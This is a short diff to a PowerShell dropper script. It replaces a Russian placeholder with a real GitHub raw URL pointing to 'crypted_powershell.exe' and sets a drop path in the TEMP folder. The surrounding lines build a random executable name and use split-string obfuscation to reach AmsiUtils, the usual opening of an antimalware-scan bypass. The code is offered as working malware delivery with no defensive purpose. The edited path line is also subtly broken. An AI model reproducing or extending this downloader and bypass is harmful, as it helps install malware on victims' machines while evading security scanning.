@@ -1,6 +1,6 @@
-$payloadUrl = 'https://СЮДА-ССЫЛКУ-НА-ФАЙЛ'
+$payloadUrl = 'https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/crypted_powershell.exe'
 $dropName   = -join((65..90+97..122)|Get-Random -Count 10|%{[char]$_}) + '.exe'
-$dropPath   = "$env:TEMP\$dropName"
+$dropPath   = "$env:TEMP\$crypted_powershell.exe"
 
 try {
     $t = [Ref].Assembly.GetType([string]::Join('',('Sy','stem','.','Man','age','ment','.','Auto','mat','ion','.','Am','si','Ut','ils')))
